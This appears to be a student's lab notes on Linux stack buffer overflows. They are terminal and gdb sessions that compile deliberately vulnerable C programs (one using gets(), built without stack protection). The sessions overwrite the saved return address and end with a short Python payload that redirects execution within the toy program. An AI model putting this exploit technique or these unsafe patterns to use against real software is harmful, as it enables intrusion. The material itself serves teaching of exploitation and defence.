#### Ch 2: Stack overflows on Linux

```c
u32@u32-VirtualBox:~/cnit127$ cat ch2a.c
#include <stdio.h>
#include <string.h>

int main()
{

	int array[5] = {1, 2, 3, 4, 5};
 	printf("%d\n", array[5]);
}
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gcc ch2a.c -g -o ch2a -z execstack -fno-stack-protector
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2a -q
Reading symbols from ./ch2a...done.
(gdb) list
1	#include <stdio.h>
2	#include <string.h>
3
4	int main()
5	{
6
7		int array[5] = {1, 2, 3, 4, 5};
8	 	printf("%d\n", array[5]);
9	}
(gdb) break 8
Breakpoint 1 at 0x804843f: file ch2a.c, line 8.
(gdb) run
Starting program: /home/u32/cnit127/ch2a

Breakpoint 1, main () at ch2a.c:8
8	 	printf("%d\n", array[5]);
(gdb) x/10x array
0xbffff5dc:	0x00000001	0x00000002	0x00000003	0x00000004
0xbffff5ec:	0x00000005	0xb7fb83dc	0xbffff610	0x00000000
0xbffff5fc:	0xb7e1a276	0x00000001
(gdb) quit
A debugging session is active.

	Inferior 1 [process 2422] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127$
```

```c
u32@u32-VirtualBox:~/cnit127$ cat ch2b.c
int main()
{
	int array[5];
	int i;

	for (i=0; i<=2000; i++)
	{
		array[i]=10;
	}
}
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gcc ch2b.c -g -o ch2b -z execstack -fno-stack-protector
```

```sh
u32@u32-VirtualBox:~/cnit127$ ./ch2b
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2b -q
Reading symbols from ./ch2b...done.
(gdb) list
1	int main()
2	{
3		int array[5];
4		int i;
5
6		for (i=0; i<=2000; i++)
7		{
8			array[i]=10;
9		}
10	}
(gdb) break 9
Breakpoint 1 at 0x8048407: file ch2b.c, line 9.
(gdb) run
Starting program: /home/u32/cnit127/ch2b

Program received signal SIGSEGV, Segmentation fault.
0x080483ed in main () at ch2b.c:8
8			array[i]=10;
(gdb) info registers
eax            0x284	644
ecx            0x259555a0	630543776
edx            0xbffff634	-1073744332
ebx            0x0	0
esp            0xbffff5e8	0xbffff5e8
ebp            0xbffff608	0xbffff608
esi            0x1	1
edi            0xb7fb8000	-1208254464
eip            0x80483ed	0x80483ed <main+18>
eflags         0x10287	[ CF PF SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/10i $eip-10
   0x80483e3 <main+8>:	cld
   0x80483e4 <main+9>:	add    BYTE PTR [eax],al
   0x80483e6 <main+11>:	add    BYTE PTR [eax],al
   0x80483e8 <main+13>:	jmp    0x80483f9 <main+30>
   0x80483ea <main+15>:	mov    eax,DWORD PTR [ebp-0x4]
=> 0x80483ed <main+18>:	mov    DWORD PTR [ebp+eax*4-0x18],0xa
   0x80483f5 <main+26>:	add    DWORD PTR [ebp-0x4],0x1
   0x80483f9 <main+30>:	cmp    DWORD PTR [ebp-0x4],0x7d0
   0x8048400 <main+37>:	jle    0x80483ea <main+15>
   0x8048402 <main+39>:	mov    eax,0x0
(gdb) x/50x &array
0xbffff5f0:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff600:	0x0000000a	0x00000284	0x00000000	0xb7e1a276
0xbffff610:	0x00000001	0xbffff6a4	0xbffff6ac	0x0000000a
0xbffff620:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff630:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff640:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff650:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff660:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff670:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff680:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff690:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff6a0:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff6b0:	0x0000000a	0x0000000a
(gdb) x/50x array
0xbffff5f0:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff600:	0x0000000a	0x00000284	0x00000000	0xb7e1a276
0xbffff610:	0x00000001	0xbffff6a4	0xbffff6ac	0x0000000a
0xbffff620:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff630:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff640:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff650:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff660:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff670:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff680:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff690:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff6a0:	0x0000000a	0x0000000a	0x0000000a	0x0000000a
0xbffff6b0:	0x0000000a	0x0000000a
(gdb)
```

```c
u32@u32-VirtualBox:~/cnit127$ cat ch2d.c
#include<stdio.h>

void function(int a, int b)
{
	int array[5];
}

main()
{
	function(1,2);
	printf("Rteurned from function\n");
}
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gcc ch2d.c -g -o ch2d -z execstack -fno-stack-protector
ch2d.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main()
 ^~~~
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ ./ch2d
Rteurned from function
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2d -q
Reading symbols from ./ch2d...done.
(gdb) list
1	#include<stdio.h>
2
3	void function(int a, int b)
4	{
5		int array[5];
6	}
7
8	main()
9	{
10		function(1,2);
(gdb)
11		printf("Rteurned from function\n");
12	}
(gdb) break 9
Breakpoint 1 at 0x8048425: file ch2d.c, line 9.
(gdb) break 11
Breakpoint 2 at 0x8048431: file ch2d.c, line 11.
(gdb) break 4
Breakpoint 3 at 0x8048411: file ch2d.c, line 4.
(gdb) info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08048425 in main at ch2d.c:9
2       breakpoint     keep y   0x08048431 in main at ch2d.c:11
3       breakpoint     keep y   0x08048411 in function at ch2d.c:4
(gdb) run
Starting program: /home/u32/cnit127/ch2d

Breakpoint 1, main () at ch2d.c:10
10		function(1,2);
(gdb) info registers
eax            0xb7fb9dbc	-1208246852
ecx            0xbffff610	-1073744368
edx            0xbffff634	-1073744332
ebx            0x0	0
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff5f8	0xbffff5f8
esi            0x1	1
edi            0xb7fb8000	-1208254464
eip            0x8048425	0x8048425 <main+17>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) continue
Continuing.

Breakpoint 3, function (a=1, b=2) at ch2d.c:6
6	}
(gdb) info registers
eax            0xb7fb9dbc	-1208246852
ecx            0xbffff610	-1073744368
edx            0xbffff634	-1073744332
ebx            0x0	0
esp            0xbffff5c0	0xbffff5c0
ebp            0xbffff5e0	0xbffff5e0
esi            0x1	1
edi            0xb7fb8000	-1208254464
eip            0x8048411	0x8048411 <function+6>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/12x $esp
0xbffff5c0:	0xb7fb8000	0xb7fb8000	0xb7ffed00	0x00040000
0xbffff5d0:	0x00000000	0xbffff6a4	0xb7e30b80	0x0804849b
0xbffff5e0:	0xbffff5f8	0x0804842e	0x00000001	0x00000002
(gdb) continue
Continuing.

Breakpoint 2, main () at ch2d.c:11
11		printf("Rteurned from function\n");
(gdb) info registers
eax            0xb7fb9dbc	-1208246852
ecx            0xbffff610	-1073744368
edx            0xbffff634	-1073744332
ebx            0x0	0
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff5f8	0xbffff5f8
esi            0x1	1
edi            0xb7fb8000	-1208254464
eip            0x8048431	0x8048431 <main+29>
eflags         0x296	[ PF AF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) continue
Continuing.
Rteurned from function
[Inferior 1 (process 2556) exited normally]
(gdb) quit
u32@u32-VirtualBox:~/cnit127$
```

```c
u32@u32-VirtualBox:~/cnit127$ cat ch2e.c
#include<stdio.h>

void function(int a, int b)
{
	int array[5];
}

main()
{
	function(1,2);
	printf("This is where the return address points");
}
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gcc ch2e.c -g -o ch2e -z execstack -fno-stack-protector -mpreferred-stack-boundary=2
ch2e.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main()
 ^~~~
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ ./ch2e
This is where the return address pointsu32@u32-VirtualBox:~/cnit127$
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2e -q
Reading symbols from ./ch2e...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048414 <+0>:		push   ebp
   0x08048415 <+1>:		mov    ebp,esp
   0x08048417 <+3>:		push   0x2
   0x08048419 <+5>:		push   0x1
   0x0804841b <+7>:		call   0x804840b <function>
   0x08048420 <+12>:	add    esp,0x8
   0x08048423 <+15>:	push   0x80484c0
   0x08048428 <+20>:	call   0x80482e0 <printf@plt>
   0x0804842d <+25>:	add    esp,0x4
   0x08048430 <+28>:	mov    eax,0x0
   0x08048435 <+33>:	leave
   0x08048436 <+34>:	ret
End of assembler dump.
(gdb) disassemble function
Dump of assembler code for function function:
   0x0804840b <+0>:	push   ebp
   0x0804840c <+1>:	mov    ebp,esp
   0x0804840e <+3>:	sub    esp,0x14
   0x08048411 <+6>:	nop
   0x08048412 <+7>:	leave
   0x08048413 <+8>:	ret
End of assembler dump.
(gdb)
```

```c
u32@u32-VirtualBox:~/cnit127$ cat ch2f.c
#include<stdio.h>

void return_input(void)
{
	char array[30];

	gets(array);
	printf("%s\n", array);
}

main()
{
	return_input();

	return 0;
}
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gcc ch2f.c -g -o ch2f -z execstack -fno-stack-protector -mpreferred-stack-boundary=2
ch2f.c: In function ‘return_input’:
ch2f.c:7:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
  gets(array);
  ^~~~
ch2f.c: At top level:
ch2f.c:11:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main()
 ^~~~
/tmp/ccx3t1Pf.o: In function `return_input':
/home/u32/cnit127/ch2f.c:7: warning: the `gets' function is dangerous and should not be used.
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ ./ch2f
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2f -q
Reading symbols from ./ch2f...done.
(gdb) disassemble return_input
Dump of assembler code for function return_input:
   0x0804843b <+0>:		push   ebp
   0x0804843c <+1>:		mov    ebp,esp
   0x0804843e <+3>:		sub    esp,0x20
   0x08048441 <+6>:		lea    eax,[ebp-0x1e]
   0x08048444 <+9>:		push   eax
   0x08048445 <+10>:	call   0x8048300 <gets@plt>
   0x0804844a <+15>:	add    esp,0x4
   0x0804844d <+18>:	lea    eax,[ebp-0x1e]
   0x08048450 <+21>:	push   eax
   0x08048451 <+22>:	call   0x8048310 <puts@plt>
   0x08048456 <+27>:	add    esp,0x4
   0x08048459 <+30>:	nop
   0x0804845a <+31>:	leave
   0x0804845b <+32>:	ret
End of assembler dump.
(gdb) break *0x08048445
Breakpoint 1 at 0x8048445: file ch2f.c, line 7.
(gdb) break *0x0804845b
Breakpoint 2 at 0x804845b: file ch2f.c, line 9.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804845c <+0>:		push   ebp
   0x0804845d <+1>:		mov    ebp,esp
   0x0804845f <+3>:		call   0x804843b <return_input>
   0x08048464 <+8>:		mov    eax,0x0
   0x08048469 <+13>:	pop    ebp
   0x0804846a <+14>:	ret
End of assembler dump.
(gdb) run
Starting program: /home/u32/cnit127/ch2f

Breakpoint 1, 0x08048445 in return_input () at ch2f.c:7
7		gets(array);
(gdb) x/20x $esp
0xbffff5dc:	0xbffff5e2	0x00000001	0xbffff6a4	0xbffff6ac
0xbffff5ec:	0x08048491	0xb7fb83dc	0x0804820c	0x08048479
0xbffff5fc:	0x00000000	0xbffff608	0x08048464	0x00000000
0xbffff60c:	0xb7e1a276	0x00000001	0xbffff6a4	0xbffff6ac
0xbffff61c:	0x00000000	0x00000000	0x00000000	0xb7fb8000
(gdb) continue
Continuing.
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD

Breakpoint 2, 0x0804845b in return_input () at ch2f.c:9
9	}
(gdb) x/20x 0xbffff5dc
0xbffff5dc:	0xbffff5e2	0x41410001	0x41414141	0x41414141
0xbffff5ec:	0x42424242	0x42424242	0x43434242	0x43434343
0xbffff5fc:	0x43434343	0x44444444	0x44444444	0x00004444
0xbffff60c:	0xb7e1a276	0x00000001	0xbffff6a4	0xbffff6ac
0xbffff61c:	0x00000000	0x00000000	0x00000000	0xb7fb8000
(gdb) x/1i $eip
=> 0x804845b <return_input+32>:	ret
(gdb) stepi
0x44444444 in ?? ()
(gdb) info registers
eax            0x29	41
ecx            0xfbad0084	-72548220
edx            0xb7fb9870	-1208248208
ebx            0x0	0
esp            0xbffff608	0xbffff608
ebp            0x44444444	0x44444444
esi            0x1	1
edi            0xb7fb8000	-1208254464
eip            0x44444444	0x44444444
eflags         0x292	[ AF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

```sh
0x0804845f <+3>:     call   0x804843b <return_input>
```

```sh
u32@u32-VirtualBox:~/cnit127$ cat ch2f.py
#!/usr/bin/python

import sys
sys.stdout.write("AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD\x5f\x84\x04\x08")
u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ chmod +x ch2f.py
```

```sh
u32@u32-VirtualBox:~/cnit127$ ./ch2f.py > ch2f-exploit
```

```sh
u32@u32-VirtualBox:~/cnit127$ cat ch2f-exploit
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD_u32@u32-VirtualBox:~/cnit127$
```

```sh
u32@u32-VirtualBox:~/cnit127$ gdb ./ch2f -q
Reading symbols from ./ch2f...done.
(gdb) run --args < ch2f-exploit
Starting program: /home/u32/cnit127/ch2f --args < ch2f-exploit
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD_�
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDd�
[Inferior 1 (process 2741) exited normally]
(gdb) quit
u32@u32-VirtualBox:~/cnit127$
```
